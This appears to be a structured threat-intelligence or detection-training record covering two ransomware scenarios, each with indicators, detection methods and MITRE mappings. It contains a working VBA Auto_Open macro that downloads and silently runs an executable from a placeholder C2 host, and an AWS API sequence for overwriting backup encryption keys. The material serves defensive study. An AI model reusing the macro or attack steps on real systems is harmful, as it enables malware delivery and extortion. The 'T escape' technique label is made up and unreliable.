technical_data.macro_code:
Sub Auto_Open()
    Dim strURL As String
    Dim WinHttpReq As Object
    strURL = "http://malicious-c2.com/payload.exe"
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", strURL, False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Dim adodbStream As Object
        Set adodbStream = CreateObject("ADODB.Stream")
        adodbStream.Type = 1 'Binary
        adodbStream.Open
        adodbStream.Write WinHttpReq.responseBody
        adodbStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
        adodbStream.Close
        Shell Environ("TEMP") & "\payload.exe", vbHide
    End If
End Sub

technical_data.ransomware_behavior: After payload execution, process enumerated drives using DeviceIoControl calls, then started encrypting files with extensions: .doc, .xls, .ppt, .pdf, .jpg. Created ransom note 'README_RECOVER.txt' in encrypted folders.

indicators: Suspicious Excel macro in email attachment with Auto_Open function downloading executable
Execution of payload.exe in temp directory spawned by excel.exe
Outbound HTTP GET request to http://malicious-c2.com/payload.exe
Registry Run key persistence under HKCU for payload.exe
File hashes: MD5 9f2d2a4c9b8b3b8f2e7d3a4e5c8f9a1b
Network connection to malicious-c2.com on TCP 80 shortly after email receipt
examples.detection_method: EDR sensors detect suspicious PowerShell and macro execution, network monitoring flags HTTP downloads from untrusted domains, Sysmon logs new process creation from Office applications, registry monitoring detects persistence, and file integrity monitoring detects ransom note creation.
relevant_mitre_techniques: T1547.001 - Registry Run Keys / Startup Folder

examples.scenario: Ransomware-as-a-Service affiliate abuses cloud misconfiguration to escalate privileges, deploy ransomware payload in containerized environment, and exfiltrate encryption keys.

technical_data.api_call_sequence:
1. AssumeRole: arn:aws:sts::123456789012:assumed-role/DevOpsRole/attacker-session
2. ListBuckets: s3.amazonaws.com
3. GetObject: enterprise-backups/keys/encryption.key
4. PutObject: enterprise-backups/keys/encryption.key (replaced with attacker key)
5. StartTasks: ecs.amazonaws.com RunTask with malicious container image

technical_data.network_traffic_pattern: Periodic HTTPS POST to C2 server api.malicious-cloud.com with encrypted payload every 10 minutes.
technical_data.ransomware_behavior: Encrypts mounted EFS volumes, deletes backups from S3 bucket by overwriting keys/encryption.key, drops ransom note in cloud storage and container logs.

indicators: IAM policy with overly permissive s3:* on all resources
CloudTrail logs showing attacker assumed role and unauthorized PutObject activity
API calls to replace encryption keys in cloud backups
Container escape commands executed inside ECS task
Malicious container image SHA256 hash
Network traffic to suspicious external C2 domains over HTTPS
Unexpected deletion and modification of S3 objects in backup bucket
examples.detection_method: Cloud security posture management detects overly broad IAM policies, CloudTrail anomaly detection flags unusual role assumption and S3 write events, container runtime security detects namespace unsharing and escape attempts, network monitoring flags C2 communications, and backup integrity monitoring alerts on key overwrites.
relevant_mitre_techniques: T1530 - Data from Cloud Storage Object
T escape - Container Escape (Custom - see MITRE CAPEC 1000+)
T1071.001 - Application Layer Protocol: Web Protocols
